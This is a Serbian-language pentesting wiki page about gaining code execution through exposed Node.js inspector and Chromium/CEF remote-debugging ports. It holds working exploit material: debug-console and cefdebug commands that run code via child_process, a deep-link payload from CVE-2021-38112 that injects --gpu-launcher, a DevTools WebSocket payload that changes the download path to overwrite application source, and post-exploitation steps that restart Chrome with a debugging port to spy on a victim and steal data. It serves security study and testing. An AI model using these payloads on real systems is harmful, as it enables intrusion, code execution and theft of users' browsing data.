# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

[Prema dokumentaciji](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Kada se pokrene sa `--inspect` switch-om, Node.js proces osluškuje debugging klijenta. Po **default-u**, osluškivaće na host-u i portu **`127.0.0.1:9229`**. Svakom procesu se takođe dodeljuje **jedinstveni** **UUID**.

Inspector klijenti moraju znati i navesti adresu host-a, port i UUID da bi se povezali. Puna URL adresa izgleda otprilike ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Pošto **debugger ima potpun pristup Node.js execution okruženju**, zlonamerni akter koji može da se poveže na ovaj port možda može da izvrši proizvoljan kod u ime Node.js procesa (**potencijalna privilege escalation**).

Postoji nekoliko načina za pokretanje inspector-a:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kada pokrenete proces koji se nadgleda, pojaviće se nešto poput ovoga:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) moraju da koriste parametar: `--remote-debugging-port=9222` da bi otvorili **debugger** (SSRF zaštite ostaju veoma slične). Međutim, umesto dodeljivanja **NodeJS** **debug** sesije, oni će komunicirati sa browserom pomoću [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), interfejsa za kontrolu browsera, ali ne postoji direktan RCE.

Kada pokrenete browser sa aktivnim debug-om, pojaviće se nešto poput sledećeg:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites otvorene u web-browseru mogu da šalju WebSocket i HTTP zahteve u okviru browser security modela. **Početna HTTP veza** neophodna je za **dobijanje jedinstvenog ID-ja debugger sesije**. **Same-origin-policy** **sprečava** websites da uspostave **ovu HTTP vezu**. Kao dodatnu zaštitu od [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da **'Host' headers** za vezu precizno navode ili **IP adresu**, ili **`localhost`**, ili **`localhost6`**.

> [!TIP]
> Ove **bezbednosne mere sprečavaju iskorišćavanje inspectora** za pokretanje koda **slanjem samo HTTP zahteva** (što bi moglo da se uradi iskorišćavanjem SSRF vuln).

### Pokretanje inspectora u pokrenutim procesima

Možete poslati **signal SIGUSR1** pokrenutom nodejs procesu kako biste pokrenuli **inspector** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljne privilegije, pa vam ovo može omogućiti **privileged access to information inside the process**, ali ne i direktnu eskalaciju privilegija.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Ovo je korisno u kontejnerima zato što **gašenje procesa i pokretanje novog** sa opcijom `--inspect` **nije moguće**, jer će **kontejner** biti **prekinut** zajedno sa procesom.

### Povezivanje sa inspector/debugger

Za povezivanje sa **pregledačem zasnovanim na Chromium-u**, URL-ovi `chrome://inspect` ili `edge://inspect` mogu da se otvore za Chrome odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution-a (RCE):

![Nakon URL-a za pristup debuggeru pojaviće se URL, npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debugger: Za povezivanje sa pregledačem zasnovanim na Chromium-u,...](<../../images/image (674).png>)

Pomoću **komandne linije** možete se povezati sa debuggerom/inspectorom pomoću:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalaženje inspectora** koji lokalno rade i **ubacivanje koda** u njih.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Imajte na umu da **NodeJS RCE exploit-i neće raditi** ako ste povezani sa browser-om putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (potrebno je proveriti API kako biste pronašli zanimljive mogućnosti za njegovo korišćenje).

## RCE u NodeJS Debugger/Inspector-u

> [!TIP]
> Ako ste ovde došli tražeći način da dobijete [**RCE putem XSS-a u Electron-u, pogledajte ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Neki uobičajeni načini za dobijanje **RCE-a** kada možete da se **povežete** na Node **inspector** jeste korišćenje nečega poput sledećeg (izgleda da ovo **neće raditi pri povezivanju sa Chrome DevTools protocol-om**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payload-ovi Chrome DevTools Protocol-a

API možete proveriti ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
U ovom odeljku ću samo navesti zanimljive stvari za koje sam otkrio da su ih ljudi koristili za exploit ovog protokola.

### Injection parametara putem Deep Links

U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kompanija Rhino Security je otkrila da je aplikacija zasnovana na CEF-u **registrovala prilagođeni UR**I** u sistemu (workspaces://index.html), koji je primao puni URI, a zatim **pokretao aplikaciju zasnovanu na CEF-u**n** sa konfiguracijom koja je delimično konstruisana iz tog URI-ja.

Otkriveno je da su parametri URI-ja URL decoded i korišćeni za pokretanje osnovne CEF aplikacije, što je korisniku omogućavalo da **injectuje** flag **`--gpu-launcher`** u **command line** i izvršava proizvoljne stvari.

Dakle, payload poput sledećeg:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Izvršiće calc.exe.

### Prepisivanje datoteka

Promenite fasciklu u koju će **preuzete datoteke biti sačuvane** i preuzmite datoteku kako biste **prepisali** često korišćeni **izvorni kôd** aplikacije svojim **zlonamernim kôdom**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

Prema ovom postu: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) moguće je dobiti RCE i izvršiti exfiltration internih stranica sa theriver-a.

### Post-Exploitation

U realnom okruženju, **nakon kompromitovanja** korisničkog računara koji koristi browser zasnovan na Chrome/Chromium-u, mogli biste pokrenuti Chrome proces sa **aktiviranim debugging-om i proslediti debugging port** kako biste mu pristupili. Na ovaj način moći ćete da **nadgledate sve što žrtva radi u Chrome-u i ukradete osetljive informacije**.

Stealth način je da **prekinete svaki Chrome proces**, a zatim pozovete nešto poput
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Reference

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
